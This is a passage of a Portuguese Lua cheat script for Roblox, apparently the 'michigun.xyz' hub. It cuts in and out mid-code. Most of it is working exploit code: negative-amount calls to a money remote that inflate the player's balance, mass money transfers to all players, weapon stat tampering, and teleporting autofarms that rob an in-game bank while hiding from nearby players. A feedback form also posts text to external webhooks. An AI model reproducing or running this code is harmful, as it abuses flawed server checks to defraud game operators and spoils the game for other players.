SectionArma:Toggle({
    Title = "Ativar",
    Desc = "Quando ativo, altera o dispositivo para o selecionado. Seu personagem será resetado.",
    Callback = function(v)
        SpoofEnabled = v
        if v then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                LocalPlayer.Character.Humanoid.Health = 0
            end
        end
    end
})

SectionArma:Space()


local ItensLoja = {
    ["AK-47"] = 15000,
    ["MPT-76"] = 8500,
    ["UZI"] = 8200,
    ["M4A1"] = 13000,
    ["GLOCK 18"] = 4300,
    ["Colete"] = 15000
}

local DropdownValues = {}
local DisplayToItem = {}

for nome, preco in pairs(ItensLoja) do
    local display = nome .. " - $" .. preco
    table.insert(DropdownValues, display)
    DisplayToItem[display] = nome
end

local ItemSelecionado = "GLOCK 18"

SectionArma:Dropdown({
    Title = "Comprar itens",
    Desc = "Compra um item na loja de civil",
    Values = DropdownValues,
    Value = "GLOCK 18 - $4300",
    Callback = function(option)
        ItemSelecionado = DisplayToItem[option]
    end
})

SectionArma:Button({
    Title = "Comprar",
    Callback = function()
        if not ItemSelecionado then return end

        local args = {
            "Buy",
            ItemSelecionado
        }

        game:GetService("ReplicatedStorage")
            :WaitForChild("Assets")
            :WaitForChild("Remotes")
            :WaitForChild("ToolsShop")
            :FireServer(unpack(args))

        Notify("Loja", "Item comprado: " .. ItemSelecionado)
    end
})

SectionArma:Space()

    local bulletsValue = nil
    local spreadValue  = nil
    local rangeValue   = nil

    SectionArma:Paragraph({
        Title = "Bullets",
        Desc = "Modifica a quantidade de balas que saem da arma por disparo. Além disso, multiplica o dano por hit.",
    })

    SectionArma:Input({
        Title = "Bullets",
        Placeholder = "Valor",
        Callback = function(v)
if v == "" then return end
            local n = tonumber(v)
            bulletsValue = n
            if n then
                Notify("Bullets", "Valor: "..tostring(n))
            else
                Notify("Bullets", "Inválido")
            end
        end
    })

    SectionArma:Paragraph({
        Title = "Spread",
        Desc = "Controla a dispersão dos tiros. Quanto maior, mais espalhado os tiros sairão da arma. Quanto menor, mais juntas as balas ficarão.",
    })

    SectionArma:Input({
        Title = "Spread",
        Placeholder = "Valor",
        Callback = function(v)
            local n = tonumber(v)
if v == "" then return end
            spreadValue = n
            if n then
                Notify("Spread", "Valor: "..tostring(n))
            else
                Notify("Spread", "Inválido")
            end
        end
    })

    SectionArma:Paragraph({
        Title = "Range",
        Desc = "Distância pela qual o disparo consegue chegar.",
    })

    SectionArma:Input({
        Title = "Range",
        Placeholder = "Valor",
        Callback = function(v)
            local n = tonumber(v)
if v == "" then return end
            rangeValue = n
            if n then
                Notify("Range", "Valor: "..tostring(n))
            else
                Notify("Range", "Inválido")
            end
        end
    })

    SectionArma:Paragraph({
        Title = "Aplicar mods",
        Desc = "Aplica as modificações na arma equipada.",
    })

    SectionArma:Button({
        Title = "Aplicar mods",
        Callback = function()
            if not HasGun() then
                Notify("Mods", "Equipe uma arma para modificar.")
                return
            end
            if bulletsValue then ModifyGun("Bullets", bulletsValue) end
            if spreadValue then ModifyGun("Spread", spreadValue) end
            if rangeValue then ModifyGun("Range", rangeValue) end
            Notify("Mods", "Aplicações feitas.")
        end
    })
end

--Autofarm
_G.AutoFarm = false

local cfg = ...
local ModoSeguro = (cfg and cfg.ModoSeguro) or false
local RaioDeSeguranca = (cfg and cfg.ModoSeguro) or 60

local PS = game:GetService("Players")
local WS = game:GetService("Workspace")
local RS = game:GetService("ReplicatedStorage")

local plr = PS.LocalPlayer
local char, root, bag

local bank = WS.Map.Robbery.Bank
local status = bank.RobberyStatus.SurfaceGui.BankStatus
local CollectPos = bank.CollectPad.Position 

local Remotes = RS.Assets.Remotes
local BuyShop = Remotes.BuyShop
local Robbery = Remotes.Robbery

local rodando = false
local ultimaVenda = 0
local DinheiroInicial = 0
local DinheiroFarmado = 0
local MIN_MONEY_REQUIRED = 1300

local FarmStatus

local AFK_DISTANCE = 10
local AFK_LEFT_POS = CollectPos - Vector3.new(AFK_DISTANCE, 0, 0)
local AFK_RIGHT_POS = CollectPos + Vector3.new(AFK_DISTANCE, 0, 0)
local AFK_SPEED = 0.02

local Kaio = WS.Map.NPCS.Kaio
local VENDER_POS = Kaio.HumanoidRootPart.Position - Vector3.new(9, 10, 0) 

local seguro
local aberto
local fechado

local function UpdateStatus(msg)
    if FarmStatus and FarmStatus.SetDesc then 
        FarmStatus:SetDesc("✌️ Status: " .. msg .. "\n💰 Farmado total: R$ " .. tostring(DinheiroFarmado))
    end
end


local function tp(v)
	if char and root then
		char:PivotTo(CFrame.new(v))
	end
end

local function esperaDinamica(delayTime)
    delayTime = delayTime or 0
    
    local startTime = tick()
    
    while aberto() and _G.AutoFarm and (tick() - startTime < delayTime) do
        
        if seguro() then 
            task.wait(0.1) 
            continue 
        end
        
        tp(AFK_LEFT_POS + Vector3.new(0, 4, 0))
        task.wait(AFK_SPEED)

        tp(AFK_RIGHT_POS + Vector3.new(0, 4, 0))
        task.wait(AFK_SPEED)
    end
    
    return not aberto() or not _G.AutoFarm
end


local function ref()
	char = plr.Character or plr.CharacterAdded:Wait()
	root = char:WaitForChild("HumanoidRootPart")
	bag  = plr:WaitForChild("Backpack")
end
ref()


local function item(n)
	local b = plr:FindFirstChild("Backpack")
	return (b and b:FindFirstChild(n)) or (char and char:FindFirstChild(n))
end

aberto = function()
	return status.Text == "ABERTO"
end

fechado = function()
    return status.Text == "FECHADO"
end


local function spin()
	char:PivotTo(root.CFrame * CFrame.Angles(0, math.rad(30), 0))
end

local function dinheiro()
	for _,v in ipairs(WS:GetDescendants()) do
		if v.Name == "Money Bag" then
			local h = v:FindFirstChildWhichIsA("BasePart")
			if not h then continue end
			local att = h:FindFirstChild("DataAttachment")
			if not att then continue end
			local gui = att:FindFirstChild("BillboardGui")
			if not gui then continue end
			local l = gui.Frame:FindFirstChild("Money")
			if l then return tonumber(l.Text:match("%d+")) or 0 end
		end
	end
	return 0
end

seguro = function()
	if not ModoSeguro then return false end
	if not root then return false end
    if not _G.AutoFarm or fechado() then return false end 

	for _,p in ipairs(PS:GetPlayers()) do
		if p ~= plr and p.Character then
			local hrp = p.Character:FindFirstChild("HumanoidRootPart")
			if hrp and (hrp.Position - root.Position).Magnitude <= RaioDeSeguranca then
				UpdateStatus("MODO SEGURO: Há algum player por perto. Aguardando...")
                
                tp(AFK_LEFT_POS + Vector3.new(0, 4, 0)) 
                
				repeat
					task.wait(0.4)
				until not _G.AutoFarm or fechado()
				or not hrp
				or (hrp.Position - root.Position).Magnitude > RaioDeSeguranca
                
                if not _G.AutoFarm or fechado() then 
                    UpdateStatus("Farm interrompido (Modo Seguro/Banco Fechado)")
                    return true 
                end

				UpdateStatus("Retomando farm...")
				return true 
			end
		end
	end

	return false
end

local c4Comprada = false
local BUY_POS = Vector3.new(-766, 19, -365)

local function tentarComprarC4()
	if c4Comprada then return true end
	if item("C4") then c4Comprada = true return true end
	UpdateStatus("Comprando C4...")
	tp(BUY_POS)
	task.wait(1)
	BuyShop:FireServer("C4")
	for i = 1, 15 do
		if item("C4") then
			c4Comprada = true
			return true
		end
		task.wait(0.1)
	end
	return false
end

local function vender(forceSell)
	UpdateStatus("Entregando...")
    
	if not forceSell and (seguro() or fechado()) then return end 
    if not _G.AutoFarm then return end
    
	tp(VENDER_POS) 
	task.wait(0.5) 
    
	while dinheiro() > 0 and _G.AutoFarm do 
		if seguro() then break end
        if not forceSell and fechado() then break end 
        
		Robbery:FireServer("Payment")
		task.wait(1) 
	end
    
    if not _G.AutoFarm then return end

	task.wait(0.5)
	tp(CollectPos)
	task.wait(0.1)
	esperaDinamica(0.5) 
	local saldoAtual = plr.leaderstats.Dinheiro.Value
	DinheiroFarmado = saldoAtual - DinheiroInicial
	UpdateStatus("Sucesso!")
end


local function farm()
    if rodando or not _G.AutoFarm then return end 
    
    if plr.leaderstats.Dinheiro.Value < MIN_MONEY_REQUIRED then
        UpdateStatus("Erro: Necessário $" .. MIN_MONEY_REQUIRED .. " para comprar C4.")
        rodando = false
        return
    end

    rodando = true

    task.spawn(function()
        if not aberto() then
            UpdateStatus("Esperando o banco abrir...")
            repeat task.wait(0.2) until aberto() or not _G.AutoFarm 
            if not _G.AutoFarm then rodando = false return end
        end

        UpdateStatus("Banco abriu! Indo comprar a C4...")

		c4Comprada = false
		if not tentarComprarC4() or not _G.AutoFarm or fechado() then 
            UpdateStatus("Erro: Não foi possível comprar C4 ou farm parado.")
            rodando = false
            return
        end

		local c4 = item("C4")
		if c4 then char.Humanoid:EquipTool(c4) end

		local prompt = bank.BankVault.C4.Handle:FindFirstChildOfClass("ProximityPrompt")
		local vaultPos = bank.BankVault.Vault.Front.Position

		local function usarC4AteSumir()
		    UpdateStatus("Plantando a C4...")
		    while aberto() and _G.AutoFarm do 
		        if seguro() then continue end
		        local c4Tool = item("C4")
		        if not c4Tool then
		            break
		        end
		        fireproximityprompt(prompt)
		        task.wait(0.15)
		    end
		end

		tp(vaultPos)
		task.wait(1)
        
        if not _G.AutoFarm or fechado() then rodando = false return end 
        
		usarC4AteSumir()
        
		if not _G.AutoFarm or fechado() then rodando = false return end 
        
		esperaDinamica(11) 
        
		while aberto() and _G.AutoFarm do 

			if seguro() then continue end

			if dinheiro() >= 4000 then
				task.wait(8)
				vender()
                if not aberto() or not _G.AutoFarm then break end 
			else
				UpdateStatus("Coletando dinheiro...")
				tp(CollectPos)
				task.wait(0.05)
				spin()
                
				if char.Humanoid.Health < 50 then
					UpdateStatus("Curando...")
					tp(AFK_LEFT_POS + Vector3.new(0, 4, 0))
                    
					repeat task.wait(0.2) until char.Humanoid.Health >= 90 or not _G.AutoFarm or fechado() 
                    if not _G.AutoFarm or fechado() then break end 
				end
                
                esperaDinamica(0.5)
                
                if not aberto() or not _G.AutoFarm then break end 
			end
		end

		rodando = false 
	end)
end

plr.CharacterAdded:Connect(function()
	task.wait(0.3)
	ref()
	if _G.AutoFarm and aberto() then
		UpdateStatus("Você morreu. Reiniciando farm")
		farm() 
	end
	char:WaitForChild("Humanoid").Died:Connect(function()
		rodando = false
		ref()
		task.wait(1)
		if _G.AutoFarm and aberto() then
			tp(CollectPos)
            tp(AFK_LEFT_POS + Vector3.new(0, 4, 0))
			farm()
		end
	end)
end)


status:GetPropertyChangedSignal("Text"):Connect(function()
	if not _G.AutoFarm then 
        rodando = false 
        return 
    end
    
	if status.Text == "ABERTO" then
		farm()
		return
	end
    
	if status.Text == "FECHADO" then
        
		local agora = tick()
		if agora - ultimaVenda < 5 then 
            rodando = false
            return 
        end
		ultimaVenda = agora
        
		task.spawn(function()
			
			if not _G.AutoFarm then return end
			local d = dinheiro()
			if d > 0 and _G.AutoFarm then 
				vender(true) 
			end
		end)
        
        rodando = false
	end
end)

plr.CharacterAdded:Connect(function()
	task.wait(0.5)
	ref()
end)


local Cash = TevezApenas:Tab({
    Title = "Autofarm",
    Icon = "lucide:wallet",
    IconColor = Color3.fromHex("#03FF20")
})

FarmStatus = Cash:Paragraph({
    Title = "",
    Desc = "",
    Color = "Green",
    Image = "",
    ImageSize = 30,
    Thumbnail = "",
    ThumbnailSize = 80,
    Locked = false,
    Buttons = {}
})

FarmStatus:SetTitle("Status do Autofarm")
UpdateStatus("Aguardando...")

local AutofarmToggle = Cash:Toggle({
    Title = "Autofarm",
    Desc = "Ativa ou desativa o autofarm.",
    Callback = function(v)
        _G.AutoFarm = v

        if v then
            if plr.leaderstats.Dinheiro.Value < MIN_MONEY_REQUIRED then
                Notify("Autofarm", "Necessário R$" .. MIN_MONEY_REQUIRED .. " para iniciar o autofarm.")
                AutofarmToggle:Set(false) 
                _G.AutoFarm = false
                return
            end
            
            rodando = false
            DinheiroInicial = plr.leaderstats.Dinheiro.Value
            DinheiroFarmado = 0
            UpdateStatus("Autofarm iniciado")
            farm() 
        else
            UpdateStatus("Autofarm desativado")
            rodando = false 
        end
    end
})
Cash:Space()

Cash:Toggle({
    Title = "Modo seguro",
    Desc = "Interrompe o autofarm caso alguém esteja a uma X distância de você.",
    Callback = function(v)
        ModoSeguro = v
        Notify("Autofarm", v and "Ativado" or "Desativado")
    end
})

Cash:Input({
    Title = "Raio de segurança",
    Desck = "Se alguém estiver dentro desse raio, interromperá o autofarm até que não haja ninguém nesse mesmo raio.",
    Placeholder = "Ex: 100 (seguro)",
    Callback = function(v)
        if v == "" then return end
        local n = tonumber(v)
        if not n then
            Notify("Autofarm", "Digite um número válido.")
            return
        end
        RaioDeSeguranca = n
        Notify("Valor", ""..tostring(n))
    end
})
end -- Section do Tevez
end -- Tab do tevez


if DELTA_MAPA then
do
	local DeltaApenas = Window:Section({
		Title = "[EB] Delta",
		Desc = "Exclusivos do jogo",
		Icon = "lucide:gamepad-2",
		IconColor = Color3.fromHex("#1C3811")
	})

	local DeltaInfinito = DeltaApenas:Tab({
		Title = "Especiais",
		Icon = "lucide:infinity",
		IconColor = Color3.fromHex("#12E038"),
		Locked = false,
	})

local Polichinelos = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Polichinelos")
local inputValor = 0

local InputJJ = DeltaInfinito:Input({
    Title = "Quantidade",
    Desc = "Adicione ou remova JJ's do seu JJ atual",
    Value = "",
    Placeholder = "Ex: 10",
    Callback = function(v)
        inputValor = v
    end
})

local ButtonJJ = DeltaInfinito:Button({
    Title = "Modificar",
    Desc = "Modifica a quantidade dos JJ's com o valor dado acima",
    Callback = function()
        local numero = tonumber(inputValor)
        if not numero or numero == 0 then
            return
        end
        local args = {
            "Add",
            numero
        }
        Polichinelos:FireServer(unpack(args))
    end
})
DeltaInfinito:Space()

	local Button = DeltaInfinito:Button({
		Title = "Receber",
		Desc = "Você ficará com o dinheiro máximo (1 milhão). Ao executar, você dará rejoin.",
		Locked = false,
		Callback = function()
			local args = {
	-1000000,
	"BuyMilitaryPass"
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Events"):WaitForChild("Economy"):WaitForChild("DecrementMoney"):FireServer(unpack(args))

			task.defer(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
			end)
		end
	})
DeltaInfinito:Space()

DeltaInfinito:Paragraph({
    Title = "Observação",
    Color = "Blue",
    Image = "lucide:info",
    ImageSize = 30,
    Desc = "Uma transferência será realizada a cada 16 segundos."
})

local remote1 = Replicated:WaitForChild("Remotes"):WaitForChild("Events"):WaitForChild("Economy"):WaitForChild("DecrementMoney")
local remote2 = Replicated:WaitForChild("Modules"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("EconomyService"):WaitForChild("RE"):WaitForChild("Transfer")

local jaReceberam = {}
local loopAtivo = false

local Toggle = DeltaInfinito:Toggle({
    Title = "Money all",
    Desc = "Transfere dinheiro para todos os jogadores do servidor.",
    Icon = "lucide:check",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        loopAtivo = state

        if state then
            local args1 = { -9e90, "BuyMilitaryPass" }
            remote1:FireServer(unpack(args1))
            Notify("michigun.xyz", "Iniciando...")

            task.spawn(function()
                while loopAtivo do
                    local playersNoServidor = Players:GetPlayers()
                    local alvoParaEnviar = nil

                    for _, player in ipairs(playersNoServidor) do
                        if player ~= LocalPlayer and not jaReceberam[player.Name] then
                            alvoParaEnviar = player
                            break
                        end
                    end

                    if not alvoParaEnviar then
                        local existemOutros = false
                        for _, p in ipairs(playersNoServidor) do
                            if p ~= LocalPlayer then
                                existemOutros = true
                                break
                            end
                        end

                        if existemOutros then
                            Notify("michigun.xyx", "Todos receberam. Reiniciando...")
                            table.clear(jaReceberam)
                            
                            for _, player in ipairs(playersNoServidor) do
                                if player ~= LocalPlayer then
                                    alvoParaEnviar = player
                                    break
                                end
                            end
                        end
                    end

                    if alvoParaEnviar then
                        local args2 = { alvoParaEnviar.Name, "10e10" }
                        remote2:FireServer(unpack(args2))
                        jaReceberam[alvoParaEnviar.Name] = true
                        
                        Notify("michigun.xyz", "Enviado para: " .. alvoParaEnviar.Name)
                    end

                    task.wait(15.5)
                end
            end)
        else
            Notify("michigun.xyz", "Interrompido.")
        end
    end
})

end
end

if SOUCRE_MAPA then

 do
local SoucreApenas = Window:Section({
    Title = "[EB] Soucre",
    Desc = "Exclusivos do jogo",
    Icon = "lucide:gamepad-2",
    IconColor = Color3.fromHex("#1C3811")
})

local AutofarmSoucre = SoucreApenas:Tab({
    Title = "Autofarm",
    Icon = "lucide:wallet",
    IconColor = Color3.fromHex("#03FF20")
})


local SelectedMode = "Lixeiro"
local IsFarming = false
local SavedCFrame = nil
local OffsetAltura = -9
local TotalProfit = 0
local SessionStartMoney = 0

local ZeroVector = Vector3.zero
local OffsetFrame = CFrame.new(0, OffsetAltura, 0)

local TrabEntregador = Workspace:WaitForChild("Trabalhos"):WaitForChild("Entregador")
local PromptsBase = TrabEntregador:WaitForChild("Prompts")
local CaixaPart = PromptsBase:WaitForChild("Caixa")

local EntregadorFolders = {
    PromptsBase:WaitForChild("Entregar_B"),
    PromptsBase:WaitForChild("Entregar_F"),
    PromptsBase:WaitForChild("Frutas"),
    PromptsBase:WaitForChild("Bebidas")
}

local LixosFolder = Workspace:WaitForChild("Trabalhos"):WaitForChild("Lixeiro"):WaitForChild("Lixos")
local LixeiraFolder = Workspace:WaitForChild("Trabalhos"):WaitForChild("Lixeiro"):WaitForChild("Lixeira")

local function HasTrashItem()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("Trash") then return true end
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if bp and bp:FindFirstChild("Trash") then return true end
    return false
end

local function TeleportTo(targetPart)
    local char = LocalPlayer.Character
    if char then
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = targetPart.CFrame * OffsetFrame
            root.AssemblyLinearVelocity = ZeroVector
            root.AssemblyAngularVelocity = ZeroVector
        end
    end
end

local ParagraphMoney = AutofarmSoucre:Paragraph({
    Title = "Autofarm",
    Desc = "Dinheiro farmado: $0",
    Color = "Green",
    Image = "lucide:coins",
    ImageSize = 25,
    Locked = false
})

local ParagraphLixos = AutofarmSoucre:Paragraph({
    Title = "Lixeiro",
    Desc = "Lixos para coleta: Calculando...",
    Color = "Blue",
    Image = "lucide:trash-2",
    ImageSize = 25,
    Locked = false
})

local Dropdown = AutofarmSoucre:Dropdown({
    Title = "Trabalho",
    Desc = "Selecione o emprego",
    Values = { "Lixeiro", "Entregador" },
    Value = "Lixeiro",
    Callback = function(Value)
        SelectedMode = Value
        ParagraphLixos.Visible = (Value == "Lixeiro")
    end
})

local Toggle = AutofarmSoucre:Toggle({
    Title = "Autofarm",
    Desc = "Ativa o autofarm",
    Value = false,
    Callback = function(state)
        IsFarming = state
        OffsetFrame = CFrame.new(0, OffsetAltura, 0)
        
        local dados = LocalPlayer:FindFirstChild("Dados")
        local dinheiro = dados and dados:FindFirstChild("Dinheiro")
        local currentMoney = dinheiro and dinheiro.Value or 0

        if state then
            SessionStartMoney = currentMoney
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                SavedCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
            end
        else
            TotalProfit = TotalProfit + (currentMoney - SessionStartMoney)
            if SavedCFrame and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = SavedCFrame
                LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = ZeroVector
            end
        end
    end
})

task.spawn(function()
    while true do
        if IsFarming then
            local dados = LocalPlayer:FindFirstChild("Dados")
            local dinheiro = dados and dados:FindFirstChild("Dinheiro")
            if dinheiro then
                local displayProfit = TotalProfit + (dinheiro.Value - SessionStartMoney)
                ParagraphMoney:SetDesc("Dinheiro farmado: $" .. tostring(displayProfit))
            end
        else
            ParagraphMoney:SetDesc("Dinheiro farmado: $" .. tostring(TotalProfit))
        end
        
        if LixosFolder then
            local count = #LixosFolder:GetChildren()
            ParagraphLixos:SetDesc("Lixos para coleta: " .. tostring(count))
        end
        
        task.wait(0.5)
    end
end)

local function FindAttachmentDestino()
    for i = 1, 4 do
        local att = EntregadorFolders[i]:FindFirstChild("AttachmentDestino")
        if att then return att end
    end
    return nil
end

task.spawn(function()
    while true do
        if IsFarming then
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("Humanoid") and char.Humanoid.Health > 0 then
                
                if SelectedMode == "Lixeiro" then
                    if not HasTrashItem() then
                        local children = LixosFolder:GetChildren()
                        local found = false
                        
                        for i = 1, #children do
                            local obj = children[i]
                            if obj:IsA("BasePart") or obj:IsA("Model") then
                                local part = obj:IsA("Model") and obj.PrimaryPart or obj
                                if part then
                                    local prompt = part:FindFirstChildWhichIsA("ProximityPrompt", true)
                                    if prompt and prompt.Enabled then
                                        prompt.HoldDuration = 0
                                        found = true
                                        local t = 0
                                        repeat
                                            if not IsFarming or char.Humanoid.Health <= 0 then break end
                                            TeleportTo(part)
                                            fireproximityprompt(prompt)
                                            RunService.Heartbeat:Wait()
                                            t = t + 1
                                        until HasTrashItem() or t > 30 or not prompt.Enabled or not part.Parent
                                        
                                        if HasTrashItem() then break end
                                    end
                                end
                            end
                        end
                        if not found then task.wait(0.2) end
                        
                    else
                        local lixeiraPart = LixeiraFolder:IsA("Model") and LixeiraFolder.PrimaryPart or LixeiraFolder:FindFirstChildWhichIsA("BasePart", true)
                        if lixeiraPart then
                            local prompt = lixeiraPart:FindFirstChildWhichIsA("ProximityPrompt", true)
                            if prompt then
                                prompt.HoldDuration = 0
                                repeat
                                    if not IsFarming or char.Humanoid.Health <= 0 then break end
                                    TeleportTo(lixeiraPart)
                                    fireproximityprompt(prompt)
                                    RunService.Heartbeat:Wait()
                                until not HasTrashItem()
                            end
                        end
                    end

                elseif SelectedMode == "Entregador" then
                    local activeAtt = FindAttachmentDestino()
                    
                    if not activeAtt then
                        local prompt = CaixaPart:FindFirstChildWhichIsA("ProximityPrompt", true)
                        if prompt then
                            prompt.HoldDuration = 0
                            repeat
                                if not IsFarming or char.Humanoid.Health <= 0 then break end
                                TeleportTo(CaixaPart)
                                fireproximityprompt(prompt)
                                RunService.Heartbeat:Wait()
                                activeAtt = FindAttachmentDestino()
                            until activeAtt
                        end
                    else
                        local destinoPart = activeAtt.Parent
                        if destinoPart then
                            local prompt = destinoPart:FindFirstChildWhichIsA("ProximityPrompt", true)
                            if prompt then
                                prompt.HoldDuration = 0
                                repeat
                                    if not IsFarming or char.Humanoid.Health <= 0 then break end
                                    TeleportTo(destinoPart)
                                    fireproximityprompt(prompt)
                                    RunService.Heartbeat:Wait()
                                until not activeAtt.Parent or activeAtt.Parent ~= destinoPart
                            end
                        end
                    end
                end
            else
                 task.wait(0.5)
            end
        else
            task.wait(0.5)
        end
        if IsFarming then RunService.Heartbeat:Wait() end
    end
end)

end
end

local Outros = Window:Section({
    Title = "Outros",
})


-- Discord
do
    local InviteCode = "michigun"
    local DiscordAPI = "https://discord.com/api/v10/invites/" .. InviteCode .. "?with_counts=true&with_expiration=true"

    local Response = WindUI.cloneref(game:GetService("HttpService")):JSONDecode(WindUI.Creator.Request({
        Url = DiscordAPI,
        Method = "GET",
        Headers = {
            ["User-Agent"] = "WindUI/Example",
            ["Accept"] = "application/json"
        }
    }).Body)

    local DiscordTab = Outros:Tab({
    Title = "Comunidade",
    Icon = "geist:logo-discord",
    IconColor = Blue
})

if Response and Response.guild then
    DiscordTab:Section({
        Title = "Entre no Discord!",
        TextSize = 30,
    })

    DiscordTab:Paragraph({
        Title = tostring(Response.guild.name),
        Desc = "Servidor oficial do michigun.xyz",
        Image = "https://cdn.discordapp.com/icons/" .. Response.guild.id .. "/" .. Response.guild.icon .. ".png?size=1024",
        Thumbnail = "https://cdn.discordapp.com/attachments/1460824919758868501/1460825713694474459/avatar.png?ex=69685376&is=696701f6&hm=c51ba032a92649e7cf903e63048f23c8d6270f4615722719e29ba1e536564bc5&",
        ImageSize = 100,
        Buttons = {
            {
                Title = "Copiar link!",
                Icon = "link",
                Callback = function()
                    setclipboard("https://discord.gg/" .. InviteCode)
                end
            }
        }
    })
end
end


-- =========================
-- 11) Sugestões
-- =========================

do
local Sugestoes = Outros:Tab({ Title = "Sugestões", Icon = "lucide:message-circle", IconColor = Yellow })

local requestFunc = syn and syn.request or request or http_request
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()

-- ======================================================
--  CONFIG
-- ======================================================

local COOLDOWN_SUGESTAO  = 1800      -- 30 min
local COOLDOWN_AVALIACAO = 21600     -- 6h

-- Arquivo persistente para armazenar timestamps
local fileName = "v" .. tostring(HWID) .. ".json"

local Saved = {
    sugestao  = 0,
    avaliacao = 0
}

-- ======================================================
--  ARQUIVOS
-- ======================================================

local function Save()
    writefile(fileName, HttpService:JSONEncode(Saved))
end

local function Load()
    if not isfile(fileName) then
        Save()
        return
    end
    
    local ok, data = pcall(function()
        return HttpService:JSONDecode(readfile(fileName))
    end)

    if ok and typeof(data) == "table" then
        Saved = data
    end
end

Load()

-- ======================================================
--  ENVIAR PARA WEBHOOK
-- ======================================================

local WEBHOOK_AVALIACAO = "https://rbxhook.cc/r/cc3ff315c0a81e4a0c4187195b3388ed"
local WEBHOOK_SUGESTAO  = "https://rbxhook.cc/r/5b1667a03cf9b0dcdfce0bb5144bf58b"

local function isoTimestamp()
    return os.date("!%Y-%m-%dT%H:%M:%S.000Z")
end

local function EnviarPayload(isSug, texto, nota, anonimo)
    local hook = isSug and WEBHOOK_SUGESTAO or WEBHOOK_AVALIACAO
    local nome = anonimo and "Anônimo" or player.Name

    local embed = {
        title = (isSug and "Sugestão feita por: " .. nome or "Avaliação feita por: " .. nome),
        description = isSug 
            and ("\n> **" .. texto .. "**\n")
            or ("Nota: **" .. nota .. "/10**\n\n> **" .. texto .. "**\n"),
        timestamp = isoTimestamp(),
        color = 14280458
    }

    requestFunc({
        Url = hook,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode({
            username = isSug and "Sugestão" or "Avaliação",
            embeds = { embed }
        })
    })
end

-- ======================================================
--  SUGESTÃO
-- ======================================================

local sugestao = Sugestoes:Section({ Title = "Sugestão? Envie-me!" })

local anonimatoSug = false
sugestao:Toggle({
    Title = "Anonimato",
    Default = false,
    Callback = function(v) anonimatoSug = v end
})

local sugestaoBox = sugestao:Input({
    Title = "Sua sugestão",
    Type = "Textarea",
    Icon = "mouse",
})

sugestao:Button({
    Title = "Enviar",
    Callback = function()
        local now = os.time()

        -- COOLDOWN
        if now < Saved.sugestao then
            local rest = Saved.sugestao - now
            Notify("COOLDOWN!", "Você só pode enviar outra sugestão em " .. rest .. " segundos.")
            return
        end

        if sugestaoBox.Value == "" then
            Notify("Erro", "Digite algo antes de enviar.")
            return
        end

        -- atualiza o cooldown
        Saved.sugestao = now + COOLDOWN_SUGESTAO
        Save()

        EnviarPayload(true, sugestaoBox.Value, nil, anonimatoSug)
        Notify("Obrigada!", "Sugestão enviada.")
    end
})

-- ======================================================
--  AVALIAÇÃO
-- ======================================================

local avaliar = Sugestoes:Section({ Title = "Avalie!" })

local anonimatoAval = false
avaliar:Toggle({
    Title = "Anonimato",
    Default = false,
    Callback = function(v) anonimatoAval = v end
})

local avaliarNota = "10"
avaliar:Dropdown({
    Title = "Nota",
    Desc = "Escolha a nota",
    Values = { "1","2","3","4","5","6","7","8","9","10" },
    Value = "10",
    Callback = function(v) avaliarNota = v end
})

local avaliarBox = avaliar:Input({
    Title = "Avaliação",
    Type = "Textarea",
    Icon = "mouse",
})

avaliar:Button({
    Title = "Enviar",
    Callback = function()
        local now = os.time()

        -- COOLDOWN
        if now < Saved.avaliacao then
            local rest = Saved.avaliacao - now
            Notify("Espere!", "Você só pode enviar outra avaliação em " .. rest .. " segundos.")
            return
        end

        if avaliarBox.Value == "" then
            Notify("Erro", "Escreva sua avaliação antes de enviar.")
            return
        end

        -- atualiza o cooldown
        Saved.avaliacao = now + COOLDOWN_AVALIACAO
        Save()

        EnviarPayload(false, avaliarBox.Value, avaliarNota, anonimatoAval)
        Notify("Agradeço!", "Avaliação enviada.")
    end
})
end

-- Configurações

local configuracoes = Window:Tab({ Title = "Configurações", Icon = "geist:settings-gear", IconColor = Grey })
	
local Toggle = configuracoes:Toggle({
    Title = "Botão flutuante",
    Desc = "Ativa o botão flutuante ao minimizar a UI.",
    Icon = "lucide:check",
    IconColor = "Green",
    Type = "Checkbox",
    Value = true,
    Callback = function(state)
    Window:EditOpenButton({
    Title = "michigun.xyz",
    Icon = "lucide:code-xml",
    CornerRadius = UDim.new(0, 5),
    StrokeThickness = 1,
    Color = ColorSequence.new(
        Color3.fromHex("#282828"), 
        Color3.fromHex("#FFFFFF")
    ),
    OnlyMobile = false,
    Enabled = state,
    Draggable = true,
})
    end
})
	
configuracoes:Input({
    Title = "Palavra secreta",
    Desc = "Palavra ou frase que será digitada no chat para abrir / fechar a UI. Padrão: /e",
    Placeholder = "Ex: /e",
    Callback = function(v)
if v == "" then return end
        local has_space = string.find(v or "", "%s")
        local is_empty = string.len(v or "") == 0
        
        if not is_empty and not has_space then
            SecretWord = v
            setupChatToggle()
            Notify("Palavra Secreta", "Definida para: " .. v .. " para abrir a UI.")
        else
            -- Notificação de erro
            Notify("Erro", "A palavra secreta não pode ser vazia nem conter espaços.")
            
            SecretWord = "/e"
            setupChatToggle()
            Notify("Palavra Secreta", "Resetada para: /e")
        end
    end
})


local KeybindKey = Enum.KeyCode.Z 
local KeybindConnection = nil 
local KeybindInitialized = false -- Novo controle de inicialização

local function setupKeybind()
    if KeybindConnection then
        KeybindConnection:Disconnect()
        KeybindConnection = nil
    end

    KeybindConnection = UIS.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end

